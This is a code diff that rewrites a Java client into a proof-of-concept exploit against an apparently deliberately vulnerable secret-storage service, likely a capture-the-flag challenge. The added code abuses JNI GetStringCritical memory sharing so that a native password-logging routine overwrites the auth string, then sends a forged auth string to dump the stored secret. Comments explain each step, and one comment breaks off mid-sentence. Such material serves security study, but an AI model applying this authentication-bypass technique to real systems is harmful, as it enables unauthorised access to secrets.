@@ -5,7 +5,7 @@ import java.io.PrintStream;
 import java.net.Socket;
 import java.nio.ByteBuffer;
 
-public class Client {
+public class POC {
     public static String server;
 
     public static byte[] joinByteArray(byte[] byte1, byte[] byte2) {
@@ -86,31 +86,33 @@ public class Client {
             System.exit(0);
         }
         server = args[0];
-
+        System.out.println("Running POC...");
         System.out.println("Connecting to: " + server);
 
-        Console console = System.console();
-        console.printf("Select your action:\n\tLOGIN\n\tDUMPSECRET\n");
-        String input = console.readLine();
-        if (input.equals("LOGIN")) {
-            console.printf("user:");
-            String username = console.readLine();
-            console.printf("password:");
-            String password = console.readLine();
-            login(username, password);
-        }
-        if (input.equals("DUMPSECRET")) {
-            console.printf("user:");
-            String username = console.readLine();
-            console.printf("password:");
-            String password = console.readLine();
-            dumpSecret(username, password);
-        }
-        if (input.equals("NEW")) {                      //[DEBUG]
-            console.printf("user:");                    //[DEBUG]
-            String username = console.readLine();       //[DEBUG]
-            newAccount(username);                       //[DEBUG]
-        }                                               //[DEBUG]
+        // create a new account with _any_ non Latin1 encodable character in the username. 
+        // This ensures the auth string is backed by a UTF-16 buffer
+        System.out.println("Requesting new account...");
+        newAccount("⨪");
+        try{ Thread.sleep(1) ; } catch (Exception e){}
+        // try to auth with any account. this causes the password log function to be called
+        // because the auth string is allready UTF-16 and not Latin1, the hotspot JNI will 
+        // pass a pointer direclty to the java heap instead of making a copy
+        //      (see ~line 2823 in https://github.com/openjdk/jdk/blob/master/src/hotspot/share/prims/jni.cpp for the implementation of jni_GetStringCritical )
+        // the native password log function assumes it has a copy, and will place '*' in every byte before printing
+        // this replaces the entire string backing buffer with the UTF-16 unicode characer made from two '*' ascii character bytes, '⨪'
+        System.out.println("Random login attempt...");
+        login("a", "a");
+        try{ Thread.sleep(1) ; } catch (Exception e){}
+        // we made the string have one char for username, one char is the ":" character, and the random password is 
+        // 64 characters, so we need 
+        
+        // byte[] t = "⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪".getBytes();
+        byte[] t = "⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪".getBytes();
+        byte[] command_type = {0x4a};
+        byte[] command = joinByteArray(command_type, t); 
+        System.out.println("Requesting secret with mangled auth string...");
+        sendCommand(command);
+
 
     }
 }
